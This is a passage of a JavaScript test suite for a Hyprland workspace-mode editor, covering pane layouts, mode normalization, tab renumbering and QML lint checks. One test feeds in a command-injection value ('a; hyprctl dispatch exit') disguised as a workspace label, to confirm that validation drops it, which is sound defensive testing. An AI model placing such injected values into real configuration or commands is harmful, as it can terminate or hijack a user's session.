  assert.match(qml, /function focusWorkspace[\s\S]*?Model\.workspaceRef\(target\)/)
  assert.match(qml, /function placeWindow[\s\S]*?Model\.workspaceRef\(workspace\)/)
  assert.doesNotMatch(qml, /"workspace " \+ workspace/)
  assert.doesNotMatch(qml, /movetoworkspacesilent " \+ workspace/)
  assert.doesNotMatch(qml, /id\.replace\(/)
})

// -------------------------------------------------------------- pane layouts

test("a pane tree fills the space it is given, without overlap or gaps", () => {
  const tree = {
    split: "row", ratio: 0.5,
    children: [
      { app: "p1" },
      { split: "column", ratio: 0.25, children: [{ app: "p2" }, { app: "p3" }] }
    ]
  }
  const { panes, dividers } = Model.paneRects(tree, 200, 100, 4)
  assert.deepEqual(panes.map(p => p.path), ["0", "10", "11"])
  // The divider is taken out of the split, so the parts still add up.
  assert.equal(panes[0].width + 4 + panes[1].width, 200)
  assert.equal(panes[1].height + 4 + panes[2].height, 100)
  assert.equal(panes[1].y + panes[1].height + 4, panes[2].y)
  // Every divider carries the extent of the split it belongs to, which is
  // what a resize needs in order to turn a pointer position into a ratio.
  const outer = dividers.find(d => d.path === "")
  assert.deepEqual(
    [outer.direction, outer.spanX, outer.spanWidth],
    ["row", 0, 200])
})

test("a pane path names a node, and every edit returns a new tree", () => {
  const one = Model.paneLeaf("a")
  const two = Model.paneSplitAt(one, "", "row")
  assert.equal(Model.paneAt(two, "0").app, "a")
  assert.equal(Model.paneAt(two, "1").app, "")
  assert.equal(one.app, "a", "the tree handed in is not mutated")

  const filled = Model.paneSetAppAt(two, "1", "b")
  assert.deepEqual(Model.paneApps(filled, []), ["a", "b"])
  assert.equal(Model.paneFindApp(filled, "b", ""), "1")
  assert.equal(Model.paneFindApp(filled, "nobody", ""), null)

  // Removing a pane promotes its sibling rather than leaving a half split.
  assert.deepEqual(Model.paneRemoveAt(filled, "0"), { app: "b" })

  // A ratio outside what is drawable is clamped, not refused.
  assert.equal(Model.paneSetRatioAt(filled, "", 9).ratio, 0.9)
  assert.equal(Model.paneSetRatioAt(filled, "", -1).ratio, 0.1)
  // A path that is not a split has no ratio to set.
  assert.equal(Model.paneSetRatioAt(filled, "0", 0.3), filled)
})

test("panes are capped in count and in depth", () => {
  let tree = Model.paneLeaf("")
  for (let i = 0; i < 200; i++) {
    const path = "1".repeat(Math.min(i, Model.MAX_SPLIT_DEPTH))
    tree = Model.paneSplitAt(tree, path, "row")
  }
  assert.ok(Model.paneCount(tree) <= Model.MAX_PANES)

  // Depth is capped too, so a config cannot recurse the renderer to death.
  let deep = Model.paneLeaf("")
  for (let i = 0; i < Model.MAX_SPLIT_DEPTH + 4; i++)
    deep = Model.paneSplitAt(deep, "1".repeat(i), "row")
  assert.equal(Model.paneAt(deep, "1".repeat(Model.MAX_SPLIT_DEPTH + 1)), null)
})

test("a mode with nothing in it starts on workspace 1, not on \"anywhere\"", () => {
  const ctx = Model.normalizeMode({ id: "new", name: "New" }, [])
  assert.deepEqual(ctx.workspaces.layouts, [{ workspace: "1", tree: { app: "" } }])
  // The same for a mode saved before there was a rule, whose one tab is an
  // empty "anywhere" nobody chose.
  const legacy = Model.normalizeMode({
    id: "old", name: "Old",
    workspaces: { layouts: [{ workspace: "", tree: { app: "" } }] }
  }, [])
  assert.deepEqual(legacy.workspaces.layouts.map(l => l.workspace), ["1"])

  // "Anywhere" is still reachable — it is what an application with no
  // workspace of its own lands in — it is just not where a mode begins.
  const loose = Model.normalizeMode({ id: "x", name: "X", applications: [{ command: "htop" }] }, [])
  assert.deepEqual(loose.workspaces.layouts.map(l => l.workspace), [""])
  assert.equal(loose.applications[0].workspace, null)

  // And a mode that has applications keeps every tab exactly as it found it,
  // including an empty one somebody added on purpose.
  const kept = Model.normalizeMode({
    id: "k", name: "K",
    applications: [{ uid: "a", desktopId: "one" }],
    workspaces: { layouts: [
      { workspace: "2", tree: { app: "a" } },
      { workspace: "", tree: { app: "" } }
    ] }
  }, [])
  assert.deepEqual(kept.workspaces.layouts.map(l => l.workspace), ["2", ""])
})

test("a mode without a stored layout gets one from the workspaces it names", () => {
  const ctx = Model.normalizeMode({
    id: "coding", name: "Coding",
    applications: [
      { desktopId: "term", workspace: 1 },
      { desktopId: "editor", workspace: 1 },
      { desktopId: "browser", workspace: 2 },
      { command: "slack" }
    ]
  }, [])
  assert.deepEqual(ctx.workspaces.layouts.map(l => l.workspace), ["1", "2", ""])
  assert.deepEqual(Model.paneApps(ctx.workspaces.layouts[0].tree, []).length, 2)
  // Nothing is left unplaced, so the canvas is the whole mode and not most of it.
  const placed = ctx.workspaces.layouts
    .reduce((n, l) => n + Model.paneApps(l.tree, []).length, 0)
  assert.equal(placed, ctx.applications.length)
})

test("panes and applications cannot drift apart", () => {
  const ctx = Model.normalizeMode({
    id: "x", name: "X",
    applications: [
      { uid: "a", desktopId: "one", workspace: 5 },
      { uid: "b", desktopId: "two", workspace: 5 }
    ],
    workspaces: {
      layouts: [{
        workspace: "3",
        tree: {
          split: "row", ratio: 0.5,
          children: [
            { app: "b" },
            // A second mention of the same application, and one of something
            // that does not exist. Both become empty panes.
            { split: "column", ratio: 0.5, children: [{ app: "b" }, { app: "ghost" }] }
          ]
        }
      }]
    }
  }, [])

  const layout = ctx.workspaces.layouts.find(l => l.workspace === "3")
  assert.deepEqual(Model.paneApps(layout.tree, []), ["b"])
  // The pane wins over the workspace the application used to claim.
  assert.equal(ctx.applications.find(a => a.uid === "b").workspace, 3)
  // The one no pane claimed keeps its own workspace, in a layout of its own.
  assert.equal(ctx.applications.find(a => a.uid === "a").workspace, 5)
  assert.ok(ctx.workspaces.layouts.some(l => l.workspace === "5"))
})

test("the panes are the launch order", () => {
  const ctx = Model.normalizeMode({
    id: "x", name: "X",
    applications: [
      { uid: "a", desktopId: "last" },
      { uid: "b", desktopId: "first" }
    ],
    workspaces: {
      layouts: [{
        workspace: "2",
        tree: { split: "row", ratio: 0.5, children: [{ app: "b" }, { app: "a" }] }
      }]
    }
  }, [])
  const plan = Model.activationPlan(ctx, {}).filter(s => s.kind === "applications")
  assert.deepEqual(plan.map(s => s.desktopId), ["first", "last"])
  assert.deepEqual(plan.map(s => s.workspace), [2, 2])
})

test("a layout labelled with something that is not a workspace is dropped", () => {
  const layouts = Model.normalizeLayouts([
    { workspace: "1", tree: { app: "" } },
    { workspace: "a; hyprctl dispatch exit", tree: { app: "" } },
    { workspace: "1", tree: { app: "" } },
    { workspace: "", tree: { app: "" } }
  ])
  // The injection attempt is gone, and the duplicate did not shadow the first.
  assert.deepEqual(layouts.map(l => l.workspace), ["1", ""])
})

test("a uid is minted once per application and survives a round trip", () => {
  const ctx = Model.normalizeMode({
    id: "x", name: "X",
    applications: [
      { desktopId: "one" },
      { uid: "dup", desktopId: "two" },
      { uid: "dup", desktopId: "three" }
    ]
  }, [])
  const uids = ctx.applications.map(a => a.uid)
  assert.equal(new Set(uids).size, 3, "no two applications share a uid")
  assert.ok(uids.every(u => /^[A-Za-z0-9_-]{1,24}$/.test(u)))

  const config = Model.normalizeConfig({ modes: [ctx] }).config
  const again = Model.parseConfig(Model.serializeConfig(config)).config
  assert.deepEqual(again.modes[0].applications.map(a => a.uid), uids)
  assert.deepEqual(again.modes[0].workspaces, ctx.workspaces)
})

test("normalizing an already normal mode changes nothing", () => {
  const once = Model.normalizeMode({
    id: "x", name: "X",
    applications: [
      { desktopId: "a", workspace: 1 },
      { desktopId: "b", workspace: 1 },
      { desktopId: "c", workspace: 2 },
      { command: "htop" }
    ]
  }, [])
  assert.deepEqual(Model.normalizeMode(once, []), once)
  assert.deepEqual(Model.reconcileMode(once), once)
})

test("the number of workspaces a mode can carry is bounded", () => {
  const applications = []
  for (let i = 0; i < Model.MAX_LAYOUTS + 10; i++)
    applications.push({ desktopId: "app" + i, workspace: i + 1 })
  const ctx = Model.normalizeMode({ id: "x", name: "X", applications }, [])
  assert.ok(ctx.workspaces.layouts.length <= Model.MAX_LAYOUTS)
})

test("the editor drives the canvas through the model, never around it", () => {
  const qml = read("EditorWindow.qml")
  // Every pane edit rebuilds the draft through reconcileMode, so the panes,
  // the application list, and each application's workspace stay in step.
  assert.match(qml, /function commitDraft\(next\) \{\s*root\.draft = Model\.reconcileMode\(next\)/)
  const canvas = read("WorkspaceCanvas.qml")
  // Drawing and hit testing read the same rectangles.
  assert.match(canvas, /readonly property var rects: Model\.paneRects\(/)
  assert.match(canvas, /function paneUnder\([\s\S]*?canvas\.rects\.panes/)
  // A workspace reaches a dispatch only through the model's own validation.
  assert.match(qml, /function renameWorkspace[\s\S]*?Model\.workspaceRef\(raw\)/)
})

test("a numbered workspace tab is a position, not a label", () => {
  const strip = ws => ws.map((w) => ({ workspace: String(w), tree: Model.paneLeaf("") }))

  // Drag the second tab to the front: the strip still counts up from one.
  assert.deepEqual(
    Model.renumberLayouts(strip([2, 1, 3])).map((l) => l.workspace),
    ["1", "2", "3"])

  // A name is a label and travels with its tab; it never takes a number, and
  // the numbered tabs around it close up rather than counting past it.
  assert.deepEqual(
    Model.renumberLayouts(strip([2, "project", 1])).map((l) => l.workspace),
    ["1", "project", "2"])

  // Everything that is not plain digits is a name: the blank "anywhere" tab,
  // a special, a relative step, a Hyprland workspace name.
  assert.deepEqual(
    Model.renumberLayouts(strip(["special:magic", 5, "+1", 2, "", "name:Deep Work"]))
      .map((l) => l.workspace),
    ["special:magic", "1", "+1", "2", "", "name:Deep Work"])

  assert.deepEqual(Model.renumberLayouts([]), [])
  // The input is not mutated; the editor clones a draft around this.
  const before = strip([3, 1])
  Model.renumberLayouts(before)
  assert.deepEqual(before.map((l) => l.workspace), ["3", "1"])
})

test("moving a workspace moves what is in it, not the number on it", () => {
  const qml = read("EditorWindow.qml")
  // The drag must renumber, or the strip reads 2, 1, 3 afterwards and no
  // number on screen says which workspace anything opens on any more.
  assert.match(qml, /function moveWorkspace[\s\S]*?Model\.renumberLayouts\(/)
  // And it must put the landing flag back, because the workspace it pointed
  // at has almost certainly just been renumbered underneath it.
  assert.match(qml, /function moveWorkspace[\s\S]*?workspaces\.target = Model\.asWorkspace\(/)
})

test("a workspace tab says what is in it", () => {
  const qml = read("WorkspaceCanvas.qml")
  // Dragging moves the contents and leaves the numbers in place, so the strip
  // reads 1 2 3 before and after. Without a count on the tab there is nothing
  // on screen that changed, and the drag reads as broken.
  assert.match(qml, /readonly property int filled: Model\.paneApps\(modelData\.tree, \[\]\)\.length/)
  assert.match(qml, /visible: cell\.filled > 0/)
})

test("no QML object sets the same property twice", () => {
  // qmllint does not catch this. Qt does, at load time, by refusing the whole
  // type — a duplicate `bordered:` on one Button took the entire workspace
  // canvas out and with it the editor, on a commit that passed lint and all
  // of these tests. So the check lives here.
  const duplicates = (source) => {
    const found = []
    // Scope stack. Only object bodies count: a JS block after `onClicked:`
    // has colons in it that are not property assignments.
    const stack = [{ object: false, seen: new Map() }]
    source.split("\n").forEach((raw, i) => {
      const line = raw.replace(/\/\/.*$/, "")
      const top = stack[stack.length - 1]
      if (top.object) {
        const m = line.match(/^\s*([A-Za-z_]\w*(?:\.\w+)*)\s*:(?!:)/)
        if (m && !/^(function|case|default|property|readonly|signal|required)$/.test(m[1])) {
          if (top.seen.has(m[1])) found.push(`line ${i + 1}: ${m[1]} (also line ${top.seen.get(m[1])})`)
          else top.seen.set(m[1], i + 1)
        }
      }
      for (const ch of line) {
        if (ch === "{") {
          // A type declaration opens an object body; anything else does not.
          const isObject = /(^|\s)[A-Z][\w.]*\s*(\{|$)/.test(line) && !/\bfunction\b/.test(line)
          stack.push({ object: isObject, seen: new Map() })
        } else if (ch === "}") {
          if (stack.length > 1) stack.pop()
        }
      }
    })
    return found
  }

  // The detector has to actually detect; prove it on the shape that broke.
  assert.deepEqual(
    duplicates(['Item {', '  Button {', '    bordered: true', '    selected: false',
                '    bordered: true', '  }', '}'].join("\n")),
    ["line 5: bordered (also line 3)"])
  // And must not fire on the same name in two different objects, or on JS.
  assert.deepEqual(
    duplicates(['Item {', '  Button { bordered: true }', '  Button { bordered: true }',
                '  onClicked: { var a = {x: 1}; var b = {x: 2} }', '}'].join("\n")),
    [])

  for (const file of qmlFiles) {
    assert.deepEqual(duplicates(read(file)), [], `${file} sets a property twice`)
  }
})

test("no overlay keeps the keyboard once it has focus", () => {
  // A layer surface held at Exclusive receives every key on the system for as
  // long as it is up, so typing meant for a terminal is delivered to whichever
  // control here has focus — and Enter or Space on a focused button is enough
  // to create, capture or delete a mode. Observed three times.
  //
  // Both overlays prime with Exclusive so they still take focus at map time,
  // then settle on OnDemand, which releases the keyboard when another window
  // is focused. The shape is the shell's own KeyboardPanel.
  for (const file of ["EditorWindow.qml", "SwitchDialog.qml"]) {
    const qml = read(file)
    assert.match(qml, /focusPrimed \? WlrKeyboardFocus\.OnDemand : WlrKeyboardFocus\.Exclusive/,
      `${file} must release the keyboard after priming`)
    assert.match(qml, /onTriggered: if \(\w+\.visible\) \w+\.focusPrimed = true/,
      `${file} must actually run the prime timer`)
    // Nothing may pin it open-endedly.
    assert.doesNotMatch(qml, /keyboardFocus: WlrKeyboardFocus\.Exclusive/,
      `${file} must not hold Exclusive unconditionally`)
  }
})
